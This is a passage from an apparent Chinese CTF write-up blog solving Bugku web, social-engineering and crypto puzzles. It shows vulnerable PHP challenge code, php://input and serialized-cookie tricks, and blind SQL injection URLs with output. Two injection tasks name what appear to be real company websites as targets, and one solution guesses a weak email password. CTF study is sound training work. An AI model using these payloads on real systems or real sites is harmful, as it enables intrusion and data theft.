rel="noopener">http://120.24.86.145:8002/web8/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));</span><br><span class="line"><span class="keyword">if</span> ($ac === $f)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:8002/web8/?ac=findneo&amp;fn=php://input</span></span><br><span class="line">post findneo</span><br><span class="line">This is flag: flag&#123;<span class="number">3</span>cfb7a90fc0de31&#125;</span><br></pre></td></tr></table></figure><h4 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h4><blockquote><p>字符？正则？</p><p><a href="http://120.24.86.145:8002/web10/" target="_blank" rel="noopener">http://120.24.86.145:8002/web10/</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">'2.php'</span>);</span><br><span class="line">$key=<span class="string">'KEY&#123;********************************&#125;'</span>;</span><br><span class="line">$IM= preg_match(<span class="string">"/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i"</span>, trim($_GET[<span class="string">"id"</span>]), $match);</span><br><span class="line"><span class="keyword">if</span>( $IM )&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">'key is: '</span>.$key);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:8002/web10/?id=keykeyxxxxkey:/x/keyp[:punct:]</span></span><br><span class="line"> key is: KEY&#123;<span class="number">0x0</span>SIOPh550afc&#125;</span><br></pre></td></tr></table></figure><h4 id="考细心"><a href="#考细心" class="headerlink" title="考细心"></a>考细心</h4><blockquote><p>地址：<a href="http://120.24.86.145:8002/web13/" target="_blank" rel="noopener">http://120.24.86.145:8002/web13/</a></p><p>想办法变成admin</p></blockquote><p>扫描到 <code>robots.txt</code>，发现<code>/resusl.php</code> 页面响应中有<code>if ($_GET[x]==$password) foo</code> 。</p><p>访问<code>/web13/resusl.php?x=admin</code> 得到<code>flag(ctf_0098_lkji-s)</code> 。</p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><blockquote><p><a href="http://120.24.86.145:8002/web14/" target="_blank" rel="noopener">http://120.24.86.145:8002/web14/</a></p><p>数据库没弄好 先别做这个题</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">﻿<span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="keyword">private</span> $conn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($username) = func_get_args();</span><br><span class="line">        $sql = sprintf(<span class="string">"SELECT * FROM users WHERE username='%s'"</span>, $username);</span><br><span class="line"></span><br><span class="line">        $obj = <span class="keyword">$this</span>-&gt;__query($sql);</span><br><span class="line">        <span class="keyword">if</span> ( $obj != <span class="keyword">false</span>  ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die( sprintf(<span class="string">"%s is %s"</span>, $obj-&gt;username, $obj-&gt;role) );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">"Nobody Nobody But You!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $FLAG;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>($username, $password) = func_get_args();</span><br><span class="line">        $username = strtolower(trim(mysql_escape_string($username)));</span><br><span class="line">        $password = strtolower(trim(mysql_escape_string($password)));</span><br><span class="line"></span><br><span class="line">        $sql = sprintf(<span class="string">"SELECT * FROM users WHERE username='%s' AND password='%s'"</span>, $username, $password);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( $username == <span class="string">'orange'</span> || stripos($sql, <span class="string">'orange'</span>) != <span class="keyword">false</span> ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">"Orange is so shy. He do not want to see you."</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $obj = <span class="keyword">$this</span>-&gt;__query($sql);</span><br><span class="line">        <span class="keyword">if</span> ( $obj != <span class="keyword">false</span> &amp;&amp; $obj-&gt;role == <span class="string">'admin'</span>  ) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">"Hi, Orange! Here is your flag: "</span> . $FLAG);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">"Admin only!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">source</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__conn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db_host, $db_name, $db_user, $db_pass, $DEBUG;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;conn)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);</span><br><span class="line">        mysql_select_db($db_name, <span class="keyword">$this</span>-&gt;conn);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($DEBUG) &#123;</span><br><span class="line">            $sql = <span class="string">"CREATE TABLE IF NOT EXISTS users ( </span></span><br><span class="line"><span class="string">                        username VARCHAR(64), </span></span><br><span class="line"><span class="string">                        password VARCHAR(64), </span></span><br><span class="line"><span class="string">                        role VARCHAR(64)</span></span><br><span class="line"><span class="string">                    ) CHARACTER SET utf8"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">            $sql = <span class="string">"INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        mysql_query(<span class="string">"SET names utf8"</span>);</span><br><span class="line">        mysql_query(<span class="string">"SET sql_mode = 'strict_all_tables'"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__query</span><span class="params">($sql, $back=true)</span> </span>&#123;</span><br><span class="line">        $result = @mysql_query($sql);</span><br><span class="line">        <span class="keyword">if</span> ($back) &#123;</span><br><span class="line">            <span class="keyword">return</span> @mysql_fetch_object($result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__die</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line"></span><br><span class="line">        header(<span class="string">"Content-Type: application/json"</span>);</span><br><span class="line">        <span class="keyword">die</span>( json_encode( <span class="keyword">array</span>(<span class="string">"msg"</span>=&gt; $msg) ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mysql_close(<span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"show"</span>, <span class="string">"login"</span>, <span class="string">"source"</span>))) &#123;</span><br><span class="line">            @call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">"What do you do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"data"</span>])) &#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">"data"</span>]);    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> HITCON(<span class="string">"source"</span>, <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h4><blockquote><p>求getshell</p><p><a href="http://120.24.86.145:8002/web9/" target="_blank" rel="noopener">http://120.24.86.145:8002/web9/</a></p></blockquote><h4 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h4><blockquote><p>地址：<a href="http://120.24.86.145:8002/flagphp/" target="_blank" rel="noopener">http://120.24.86.145:8002/flagphp/</a></p><p>点了login咋没反应</p><p>提示：hint</p></blockquote><p>根据提示访问<code>http://120.24.86.145:8002/flagphp/?hint=1</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>); </span><br><span class="line">$cookie = $_COOKIE[<span class="string">'ISecer'</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>) &#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;html&gt;foo &lt;/html&gt; </span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">&#125; </span><br><span class="line">$KEY=<span class="string">'ISecer:www.isecer.com'</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本以为请求头cookie添加键值对<code>ISecer:s:21:&quot;ISecer:www.isecer.com&quot;;</code> 即可。但这里很有趣，因为此处$KEY值仍为空，所以添加的键值对是<code>ISecer:s:0:&quot;&quot;;</code> 。<code>flag{unserialize_by_virink}</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">var_dump($foo);</span><br><span class="line">$foo=<span class="string">'foo'</span>; </span><br><span class="line">var_dump($foo);</span><br><span class="line">var_dump($bar);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$bar=<span class="string">'bar'</span>;</span><br><span class="line">var_dump($bar);</span><br><span class="line">---------------运行结果如下----------</span><br><span class="line">Notice: Undefined variable: foo in C:\Users\*\Desktop\tets.php on line <span class="number">2</span></span><br><span class="line"><span class="keyword">NULL</span></span><br><span class="line">string(<span class="number">3</span>) <span class="string">"foo"</span></span><br><span class="line">Notice: Undefined variable: bar in C:\Users\*\Desktop\tets.php on line <span class="number">5</span></span><br><span class="line"><span class="keyword">NULL</span></span><br><span class="line">string(<span class="number">3</span>) <span class="string">"bar"</span></span><br><span class="line">PHP Notice:  Undefined variable: foo in C:\Users\*\Desktop\tets.php on line <span class="number">2</span></span><br><span class="line">PHP Notice:  Undefined variable: bar in C:\Users\*\Desktop\tets.php on line <span class="number">5</span></span><br></pre></td></tr></table></figure><h4 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h4><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&gt; 地址：http:<span class="comment">//120.24.86.145:8002/web15/</span></span><br><span class="line">&gt;</span><br><span class="line">&gt; flag格式：flag&#123;xxxxxxxxxxxx&#125;</span><br><span class="line">&gt; 不如写个Python吧</span><br><span class="line">&gt;</span><br><span class="line">&gt; error_reporting(<span class="number">0</span>);</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">&gt; $ip = <span class="string">''</span>;</span><br><span class="line">&gt; <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">&gt; $ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&gt; &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">&gt; $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt; $ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line">&gt; <span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line">&gt;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br><span class="line">&gt; $host=<span class="string">"localhost"</span>;</span><br><span class="line">&gt; $user=<span class="string">""</span>;</span><br><span class="line">&gt; $pass=<span class="string">""</span>;</span><br><span class="line">&gt; $db=<span class="string">""</span>;</span><br><span class="line">&gt;</span><br><span class="line">&gt; $connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line">&gt;</span><br><span class="line">&gt; mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line">&gt;</span><br><span class="line">&gt; $ip = getIp();</span><br><span class="line">&gt; <span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">&gt; $sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">&gt; mysql_query($sql);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h4><blockquote><p><a href="http://47.93.190.246:49166/" target="_blank" rel="noopener">http://47.93.190.246:49166/</a><br>flag格式：SKCTF{xxxxxxxxxxxxxxxx}<br>hint:文件包含</p></blockquote><p>重定向到<code>/index.php?file=hello.php</code> ，响应头提示<code>include.php</code> ,注释提示<code>upload.php</code> 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">403</span></span><br><span class="line">http:<span class="comment">//47.93.190.246:49166/admin.phps</span></span><br><span class="line">http:<span class="comment">//47.93.190.246:49166/index.phps</span></span><br><span class="line">http:<span class="comment">//47.93.190.246:49166/login.phps</span></span><br><span class="line">http:<span class="comment">//47.93.190.246:49166/.htaccess</span></span><br><span class="line"><span class="number">301</span></span><br><span class="line">  http:<span class="comment">//47.93.190.246:49166/upload</span></span><br><span class="line"><span class="number">200</span></span><br><span class="line">  http:<span class="comment">//47.93.190.246:49166/upload.php</span></span><br></pre></td></tr></table></figure><h4 id="实战2-注入"><a href="#实战2-注入" class="headerlink" title="实战2-注入"></a>实战2-注入</h4><blockquote><p><a href="http://www.kabelindo.co.id" target="_blank" rel="noopener">http://www.kabelindo.co.id</a></p><p>flag格式 flag{数据库最后一个表名字}</p></blockquote><h4 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h4><blockquote><p><a href="http://120.24.86.145:9001/sql/" target="_blank" rel="noopener">http://120.24.86.145:9001/sql/</a></p><p>flag格式flag{}</p></blockquote><h4 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h4><blockquote><p> <a href="http://120.24.86.145:9004" target="_blank" rel="noopener">http://120.24.86.145:9004</a></p><p> 本题有2个flag</p><p> flag格式 flag{}</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//120.24.86.145:9004/1ndex.php?id=5%27||ascii(mid(database(),1,1))=ascii(%27w%27)--+</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /<span class="number">1</span>ndex.php?id=<span class="number">5</span>%<span class="number">27</span>||ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">119</span>--+</span><br><span class="line"><span class="string">''</span>.join(map(chr,[<span class="number">119</span>,<span class="number">101</span>,<span class="number">98</span>,<span class="number">49</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">50</span>,<span class="number">45</span>,<span class="number">49</span>]))</span><br><span class="line"><span class="string">'web1002-1'</span></span><br><span class="line"> </span><br><span class="line">http:<span class="comment">//120.24.86.145:9004/1ndex.php?id=5%27||ascii(mid(database(),1,1))%3E0--+</span></span><br><span class="line">bingo=<span class="string">"There is nothing"</span></span><br><span class="line">ohno=<span class="string">"You can do some SQL injection in here"</span></span><br><span class="line">  </span><br><span class="line">http:<span class="comment">//120.24.86.145:9004/1ndex.php?id=1%27||if(ascii(mid(select%20%22asdf%22,1,1))%3E0,sleep(10),0)--+</span></span><br></pre></td></tr></table></figure><h4 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h4><blockquote><p><a href="http://120.24.86.145:8007/web2/" target="_blank" rel="noopener">http://120.24.86.145:8007/web2/</a></p><p>全都tm过滤了绝望吗？</p><p>提示 !,!=,=,+,-,^,%</p></blockquote><h4 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h4><blockquote><p><a href="http://wp.bugku.com/" target="_blank" rel="noopener">http://wp.bugku.com/</a></p><p>出题花了10分钟，应该很简单的，</p><p>进网站看看就明白了。</p><p>需要用到渗透测试第一步信息收集</p></blockquote><h4 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h4><blockquote><p><a href="http://47.93.190.246:49165/" target="_blank" rel="noopener">http://47.93.190.246:49165/</a><br>SKCTF{xxxxxxxxxxxxxxxxxxxxx}<br>hint:union，命令执行</p><p>来源：山科大</p></blockquote><h4 id="login3"><a href="#login3" class="headerlink" title="login3"></a>login3</h4><blockquote><p><a href="http://47.93.190.246:49167/" target="_blank" rel="noopener">http://47.93.190.246:49167/</a><br>flag格式：SKCTF{xxxxxxxxxxxxx}<br>hint：基于布尔的SQL盲注</p><p>来源：山科大</p></blockquote><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><blockquote><p><a href="http://103.238.227.13:10088/" target="_blank" rel="noopener">http://103.238.227.13:10088/</a><br>FLAG格式 Flag:””</p></blockquote><h4 id="实战1-注入"><a href="#实战1-注入" class="headerlink" title="实战1-注入"></a>实战1-注入</h4><blockquote><p><a href="http://www.interplay.com" target="_blank" rel="noopener">http://www.interplay.com</a></p><p>flag格式 flag{数据库的第一个表名}</p></blockquote><h4 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h4><blockquote><p><a href="http://120.24.86.145:9002/" target="_blank" rel="noopener">http://120.24.86.145:9002/</a></p><p>hint：不要一次就放弃</p></blockquote><h4 id="login4"><a href="#login4" class="headerlink" title="login4"></a>login4</h4><blockquote><p><a href="http://47.93.190.246:49168/" target="_blank" rel="noopener">http://47.93.190.246:49168/</a><br>flag格式：SKCTF{xxxxxxxxxxxxxxxx}<br>hint:CBC字节翻转攻击</p><p>来源：山科大</p></blockquote><h3 id="Social"><a href="#Social" class="headerlink" title="Social"></a>Social</h3><h4 id="密码？？？"><a href="#密码？？？" class="headerlink" title="密码？？？"></a>密码？？？</h4><blockquote><p>姓名：张三<br>生日；19970315</p><p>KEY格式KEY{xxxxxxxxxx}</p></blockquote><p>KEY{zs19970315}</p><h4 id="信息查找？？？"><a href="#信息查找？？？" class="headerlink" title="信息查找？？？"></a>信息查找？？？</h4><blockquote><p>社会工程学基础题目 信息查找</p><p>听说bugku.cn 在今日头条上能找到？？</p><p>提示：flag为群号码</p><p>格式KEY{xxxxxxxxxxx}</p></blockquote><p>访问<code>https://www.google.com/search?q=bugku.cn+site%3Atoutiao.com</code> ，得到<code>462713425</code> </p><h4 id="入门题目，社工帝？"><a href="#入门题目，社工帝？" class="headerlink" title="入门题目，社工帝？"></a>入门题目，社工帝？</h4><blockquote><p>name:孤长离</p><p>提示：弱口令</p></blockquote><p>搜索孤长离到一个贴吧，弱口令登陆邮箱<a href="mailto:`bkctftest@163.com" target="_blank" rel="noopener">`bkctftest@163.com</a><code>得到</code>KEY{sg1H78Si9C0s99Q}` 。</p><h4 id="简单的社工尝试"><a href="#简单的社工尝试" class="headerlink" title="简单的社工尝试"></a>简单的社工尝试</h4><blockquote><p>这个狗就是我画的，而且当了头像<br>这题提示的其实很明显了<br>想想吧</p></blockquote><p>谷歌识图到达<code>https://github.com/bugku</code> ，然后到<code>https://weibo.com/bugku</code> ，然后是<code>http://c.bugku.com/13211.txt</code> ，就得到<code>flag{BUku_open_shgcx1}</code> 。</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="滴答-滴"><a href="#滴答-滴" class="headerlink" title="滴答~滴"></a>滴答~滴</h4><blockquote><p>-… -.- -.-. - ..-. – .. … -.-.</p><p>答案格式KEY{xxxxxxxxx}</p></blockquote><p><code>key{bkctfmisc}</code> </p><p>推荐这个<a href="https://github.com/findneo/fcode" target="_blank" rel="noopener">小工具</a> </p><h4 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h4><blockquote><p>一只小羊翻过了2个栅栏</p><p>KYsd3js2E{a2jda}</p></blockquote><p><code>KEY{sad23jjdsa2}</code> </p><p>推荐这个<a 